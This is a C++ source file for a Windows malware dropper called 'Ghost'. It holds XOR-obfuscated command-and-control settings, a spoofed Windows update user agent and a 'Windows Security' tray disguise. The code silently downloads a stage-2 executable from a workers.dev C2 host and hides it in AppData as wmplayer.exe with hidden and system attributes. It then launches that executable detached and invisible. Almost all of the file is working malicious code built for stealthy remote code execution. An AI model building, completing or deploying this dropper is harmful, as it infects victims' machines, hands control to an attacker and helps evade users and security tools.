// launcher.cpp — Ghost Stage-1 Dropper
//
// Professional stager. Capabilities:
//   - Runs silently on startup — no user interaction required
//   - Drops stage-2 into %APPDATA%\Microsoft\Windows\WinStore\ (blends with system files)
//   - Validates PE header before executing — won't run corrupt/truncated downloads
//   - 3-attempt retry with exponential backoff on network failures
//   - Atomic write (tmp → rename) — no partial binaries on disk
//   - Hidden + System file attributes on the written binary
//   - Threaded download — message loop never blocks
//   - Single-instance mutex — no process stacking
//   - Invisible message-only window — no taskbar, no console, no visible surface
//   - Tray icon for operator control (optional, can be stripped for full stealth)
//
// CONFIGURE BEFORE BUILDING:
//   LAUNCHER_C2_HOST     — Cloudflare Worker hostname (no https://, no slash)
//   LAUNCHER_BEACON_TOKEN — must match BEACON_TOKEN set via wrangler secret put
//
// Build (MinGW-w64):
//   x86_64-w64-mingw32-g++ -std=c++17 -DUNICODE -D_UNICODE -mwindows
//     -static -static-libgcc -static-libstdc++ -O2 -s
//     src/launcher.cpp -luser32 -lshell32 -lwinhttp -o build/launcher.exe

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include "obfuscate.hpp"
#include <algorithm>

// ---------------------------------------------------------------------------
// *** CONFIGURE THESE BEFORE BUILDING ***
// ---------------------------------------------------------------------------

// C2 config — stored XOR-obfuscated via XSW, decrypted only at runtime
static std::wstring GetLauncherC2Host() {
    static wchar_t buf[64] = {};
    if (!buf[0]) {
        auto s = XSW(L"ghost-c2.sujallamichhane.workers.dev");
        wcsncpy_s(buf, s.str(), _TRUNCATE);
    }
    return buf;
}
static std::wstring GetLauncherToken() {
    static wchar_t buf[65] = {};
    if (!buf[0]) {
        auto s = XSW(L"a29e179bcfe4ec04c224ce5cf3b4a7e51cc5ba51228c9093a4215ed5ffadc260");
        wcsncpy_s(buf, s.str(), _TRUNCATE);
    }
    return buf;
}

// ---------------------------------------------------------------------------
// Tunables
// ---------------------------------------------------------------------------

static constexpr INTERNET_PORT C2_PORT          = 443;
static constexpr DWORD         MAX_PAYLOAD_BYTES = 64 * 1024 * 1024; // 64 MB hard cap
static constexpr int           DOWNLOAD_RETRIES  = 3;
static constexpr DWORD         RETRY_BASE_MS     = 5000; // 5s, 10s, 15s

// ---------------------------------------------------------------------------
// Tray constants
// ---------------------------------------------------------------------------

static constexpr UINT WM_TRAY_MSG  = WM_USER + 1;
static constexpr UINT ID_TRAY_ICON = 1;
static constexpr UINT ID_STAGE2    = 100;
static constexpr UINT ID_EXIT      = 101;

static const wchar_t* WINDOW_CLASS = L"GhostDropperWnd_v2";
static const wchar_t* TRAY_TIP     = L"Windows Security";  // blends in

// Stage-2 binary name — mimics a real Windows component
static const wchar_t* STAGE2_NAME  = L"wmplayer.exe";

// ---------------------------------------------------------------------------
// GetStage2Path — writes to AppData\Microsoft\Windows\WinStore
//
// This directory already exists on modern Windows and is writable
// without elevation. Binaries here attract less suspicion than Desktop.
// ---------------------------------------------------------------------------

static std::wstring GetStage2Path() {
    wchar_t appdata[MAX_PATH] = {};
    if (SHGetFolderPathW(nullptr, CSIDL_APPDATA, nullptr, SHGFP_TYPE_CURRENT, appdata) != S_OK)
        return L"";
    return std::wstring(appdata) + L"\\Microsoft\\Windows\\WinStore\\" + STAGE2_NAME;
}

// ---------------------------------------------------------------------------
// EnsureDirectoryPath — creates all intermediate directories in the path.
// Equivalent to mkdir -p for wide strings.
// ---------------------------------------------------------------------------

static BOOL EnsureDirectoryPath(const std::wstring& path) {
    std::wstring current;
    for (size_t i = 0; i <= path.size(); ++i) {
        if (i == path.size() || path[i] == L'\\') {
            if (!current.empty()) {
                CreateDirectoryW(current.c_str(), nullptr);
                // Ignore ERROR_ALREADY_EXISTS — that's fine
            }
        }
        if (i < path.size()) current += path[i];
    }
    return TRUE;
}

// ---------------------------------------------------------------------------
// IsProcessRunning — TRUE if any process with exeName is in the snapshot
// ---------------------------------------------------------------------------

static BOOL IsProcessRunning(const wchar_t* exeName) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);

    BOOL found = FALSE;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exeName) == 0) {
                found = TRUE;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }

    CloseHandle(snap);
    return found;
}

// ---------------------------------------------------------------------------
// ValidatePE — minimal PE header check
//
// Rejects empty buffers, non-MZ files, and buffers where the PE signature
// offset points outside the buffer. Prevents executing truncated downloads.
// ---------------------------------------------------------------------------

static BOOL ValidatePE(const std::vector<BYTE>& data) {
    if (data.size() < 64) return FALSE;

    // MZ magic
    if (data[0] != 'M' || data[1] != 'Z') return FALSE;

    // PE signature offset is a DWORD at offset 0x3C
    DWORD peOffset = *reinterpret_cast<const DWORD*>(&data[0x3C]);
    if (static_cast<size_t>(peOffset) + 4 > data.size()) return FALSE;

    // PE\0\0 signature
    if (data[peOffset]     != 'P' ||
        data[peOffset + 1] != 'E' ||
        data[peOffset + 2] != 0   ||
        data[peOffset + 3] != 0) return FALSE;

    return TRUE;
}

// ---------------------------------------------------------------------------
// WinHTTP RAII handle wrapper
// ---------------------------------------------------------------------------

struct WinHttpHandles {
    HINTERNET session = nullptr;
    HINTERNET connect = nullptr;
    HINTERNET request = nullptr;

    ~WinHttpHandles() {
        if (request) WinHttpCloseHandle(request);
        if (connect) WinHttpCloseHandle(connect);
        if (session) WinHttpCloseHandle(session);
    }
    WinHttpHandles() = default;
    WinHttpHandles(const WinHttpHandles&) = delete;
    WinHttpHandles& operator=(const WinHttpHandles&) = delete;
};

// ---------------------------------------------------------------------------
// HttpGet — single download attempt. Returns true + fills payload on success.
// ---------------------------------------------------------------------------

static BOOL HttpGet(std::vector<BYTE>& payload) {
    WinHttpHandles h;

    // Mimics Windows Update agent — blends with background traffic
    h.session = WinHttpOpen(
        L"Microsoft-WNS/10.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0
    );
    if (!h.session) return FALSE;

    // 15-second connect + receive timeouts — don't hang forever
    DWORD timeout = 15000;
    WinHttpSetOption(h.session, WINHTTP_OPTION_CONNECT_TIMEOUT,    &timeout, sizeof(timeout));
    WinHttpSetOption(h.session, WINHTTP_OPTION_RECEIVE_TIMEOUT,    &timeout, sizeof(timeout));
    WinHttpSetOption(h.session, WINHTTP_OPTION_SEND_TIMEOUT,       &timeout, sizeof(timeout));
    WinHttpSetOption(h.session, WINHTTP_OPTION_RESOLVE_TIMEOUT,    &timeout, sizeof(timeout));

    std::wstring c2host = GetLauncherC2Host();
    h.connect = WinHttpConnect(h.session, c2host.c_str(), C2_PORT, 0);
    if (!h.connect) return FALSE;

    h.request = WinHttpOpenRequest(
        h.connect,
        L"GET", L"/payload",
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    if (!h.request) return FALSE;

    // Auth header — XSW so header name is not plaintext in binary
    auto hdrName = XSW(L"X-Beacon-Token: ");
    std::wstring auth = std::wstring(hdrName.str()) + GetLauncherToken() + L"\r\n";
    WinHttpAddRequestHeaders(
        h.request,
        auth.c_str(),
        static_cast<DWORD>(auth.size()),
        WINHTTP_ADDREQ_FLAG_ADD
    );

    if (!WinHttpSendRequest(h.request,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) return FALSE;

    if (!WinHttpReceiveResponse(h.request, nullptr)) return FALSE;

    // Verify HTTP 200
    DWORD status = 0, statusLen = sizeof(status);
    WinHttpQueryHeaders(h.request,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &status, &statusLen, WINHTTP_NO_HEADER_INDEX);
    if (status != 200) return FALSE;

    // Stream response body
    payload.clear();
    payload.reserve(1024 * 1024);

    DWORD available = 0;
    while (WinHttpQueryDataAvailable(h.request, &available) && available > 0) {
        std::vector<BYTE> chunk(available);
        DWORD read = 0;
        if (!WinHttpReadData(h.request, chunk.data(), available, &read) || read == 0) break;
        payload.insert(payload.end(), chunk.begin(), chunk.begin() + read);
        if (payload.size() > MAX_PAYLOAD_BYTES) return FALSE;
    }

    return !payload.empty();
}

// ---------------------------------------------------------------------------
// DownloadAndDrop — fetch with retries, validate, atomic write, hide
// ---------------------------------------------------------------------------

static BOOL DownloadAndDrop(const std::wstring& targetPath) {
    std::vector<BYTE> payload;

    // Retry loop with exponential backoff
    for (int attempt = 1; attempt <= DOWNLOAD_RETRIES; ++attempt) {
        payload.clear();
        BOOL ok = HttpGet(payload);

        if (ok && ValidatePE(payload)) {
            break; // got a valid binary
        }

        if (attempt < DOWNLOAD_RETRIES) {
            Sleep(RETRY_BASE_MS * static_cast<DWORD>(attempt));
            payload.clear();
        } else {
            return FALSE; // all retries exhausted
        }
    }

    if (payload.empty() || !ValidatePE(payload)) return FALSE;

    // Ensure the drop directory exists
    std::wstring dir = targetPath.substr(0, targetPath.rfind(L'\\'));
    EnsureDirectoryPath(dir);

    // Atomic write: write to .tmp, then rename over final path
    // This prevents a partial binary from ever being executed
    std::wstring tmpPath = targetPath + L".tmp";

    HANDLE hFile = CreateFileW(
        tmpPath.c_str(),
        GENERIC_WRITE, 0, nullptr,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH,
        nullptr
    );
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD written = 0;
    BOOL writeOk = WriteFile(
        hFile,
        payload.data(),
        static_cast<DWORD>(payload.size()),
        &written, nullptr
    );
    CloseHandle(hFile);

    if (!writeOk || written != static_cast<DWORD>(payload.size())) {
        DeleteFileW(tmpPath.c_str());
        return FALSE;
    }

    // Atomic rename — replaces existing file if present
    if (!MoveFileExW(tmpPath.c_str(), targetPath.c_str(),
                     MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
        DeleteFileW(tmpPath.c_str());
        return FALSE;
    }

    // Hide the binary — won't appear in Explorer without "Show hidden files"
    SetFileAttributesW(targetPath.c_str(),
        FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

    return TRUE;
}

// ---------------------------------------------------------------------------
// SpawnDetached — launch the stage-2 binary invisible and detached
// ---------------------------------------------------------------------------

static BOOL SpawnDetached(const std::wstring& path) {
    STARTUPINFOW si    = {};
    si.cb              = sizeof(si);
    si.dwFlags         = STARTF_USESHOWWINDOW;
    si.wShowWindow     = SW_HIDE;

    PROCESS_INFORMATION pi = {};
    std::wstring cmdLine   = L"\"" + path + L"\"";

    BOOL ok = CreateProcessW(
        nullptr, &cmdLine[0],
        nullptr, nullptr,
        FALSE,
        CREATE_NO_WINDOW | DETACHED_PROCESS,
        nullptr, nullptr,
        &si, &pi
    );

    if (ok) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    return ok;
}

// ---------------------------------------------------------------------------
// LaunchStage2 — full pipeline:
//   check running → get path → download if missing → validate → spawn
// ---------------------------------------------------------------------------

static BOOL LaunchStage2() {
    // Already running — nothing to do
    if (IsProcessRunning(STAGE2_NAME)) return TRUE;

    std::wstring stage2Path = GetStage2Path();
    if (stage2Path.empty()) return FALSE;

    // Download if not on disk (first run) or if file was deleted
    if (GetFileAttributesW(stage2Path.c_str()) == INVALID_FILE_ATTRIBUTES) {
        if (!DownloadAndDrop(stage2Path)) return FALSE;
        Sleep(300); // brief settle after write
    }

    // Re-validate the on-disk binary before executing
    // Catches truncated/corrupted files from a previous run
    {
        HANDLE hf = CreateFileW(stage2Path.c_str(), GENERIC_READ, FILE_SHARE_READ,
                                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hf == INVALID_HANDLE_VALUE) return FALSE;

        LARGE_INTEGER fileSize = {};
        GetFileSizeEx(hf, &fileSize);
        std::vector<BYTE> header(std::min(fileSize.QuadPart, (LONGLONG)4096));
        DWORD rd = 0;
        ReadFile(hf, header.data(), static_cast<DWORD>(header.size()), &rd, nullptr);
        CloseHandle(hf);

        header.resize(rd);
        if (!ValidatePE(header)) {
            // Corrupt — re-download
            DeleteFileW(stage2Path.c_str());
            if (!DownloadAndDrop(stage2Path)) return FALSE;
            Sleep(300);
        }
    }

    return SpawnDetached(stage2Path);
}

// ---------------------------------------------------------------------------
// Background thread — runs LaunchStage2 without blocking the message loop
// ---------------------------------------------------------------------------

static DWORD WINAPI LaunchThreadProc(LPVOID) {
    LaunchStage2();
    return 0;
}

// ---------------------------------------------------------------------------
// Tray icon
// ---------------------------------------------------------------------------

static NOTIFYICONDATAW g_nid = {};

static void AddTrayIcon(HWND hwnd) {
    g_nid.cbSize           = sizeof(g_nid);
    g_nid.hWnd             = hwnd;
    g_nid.uID              = ID_TRAY_ICON;
    g_nid.uFlags           = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    g_nid.uCallbackMessage = WM_TRAY_MSG;
    g_nid.hIcon            = LoadIconW(nullptr, IDI_APPLICATION);
    wcsncpy_s(g_nid.szTip, TRAY_TIP, _TRUNCATE);
    Shell_NotifyIconW(NIM_ADD, &g_nid);
}

static void RemoveTrayIcon() {
    Shell_NotifyIconW(NIM_DELETE, &g_nid);
}

static void ShowTrayMenu(HWND hwnd) {
    POINT pt = {};
    GetCursorPos(&pt);

    HMENU menu   = CreatePopupMenu();
    BOOL running = IsProcessRunning(STAGE2_NAME);

    AppendMenuW(menu, MF_STRING | (running ? MF_GRAYED : 0),
                ID_STAGE2, running ? L"Active" : L"Activate");
    AppendMenuW(menu, MF_SEPARATOR, 0, nullptr);
    AppendMenuW(menu, MF_STRING, ID_EXIT, L"Exit");

    SetForegroundWindow(hwnd);
    TrackPopupMenu(menu, TPM_BOTTOMALIGN | TPM_LEFTALIGN,
                   pt.x, pt.y, 0, hwnd, nullptr);
    DestroyMenu(menu);
}

// ---------------------------------------------------------------------------
// Window procedure
// ---------------------------------------------------------------------------

static LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
        case WM_CREATE:
            AddTrayIcon(hwnd);
            // Auto-launch stage-2 immediately on startup — no user click needed
            CreateThread(nullptr, 0, LaunchThreadProc, nullptr, 0, nullptr);
            return 0;

        case WM_TRAY_MSG:
            if (lp == WM_RBUTTONUP || lp == WM_LBUTTONUP) {
                ShowTrayMenu(hwnd);
            }
            return 0;

        case WM_COMMAND:
            switch (LOWORD(wp)) {
                case ID_STAGE2:
                    // Manual trigger — spawns download thread
                    CreateThread(nullptr, 0, LaunchThreadProc, nullptr, 0, nullptr);
                    return 0;
                case ID_EXIT:
                    DestroyWindow(hwnd);
                    return 0;
            }
            break;

        case WM_DESTROY:
            RemoveTrayIcon();
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProcW(hwnd, msg, wp, lp);
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    // Single-instance guard — prevents process stacking
    HANDLE mutex = CreateMutexW(nullptr, TRUE, L"GhostDropperMutex_v2");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(mutex);
        return 0;
    }

    WNDCLASSW wc     = {};
    wc.lpfnWndProc   = WndProc;
    wc.hInstance     = hInst;
    wc.lpszClassName = WINDOW_CLASS;
    RegisterClassW(&wc);

    // HWND_MESSAGE — message-only window. No taskbar, no visual surface.
    HWND hwnd = CreateWindowExW(
        0, WINDOW_CLASS, L"",
        0, 0, 0, 0, 0,
        HWND_MESSAGE,
        nullptr, hInst, nullptr
    );
    if (!hwnd) { CloseHandle(mutex); return 1; }

    // Message loop — download runs in background thread
    MSG msg = {};
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    CloseHandle(mutex);
    return static_cast<int>(msg.wParam);
}
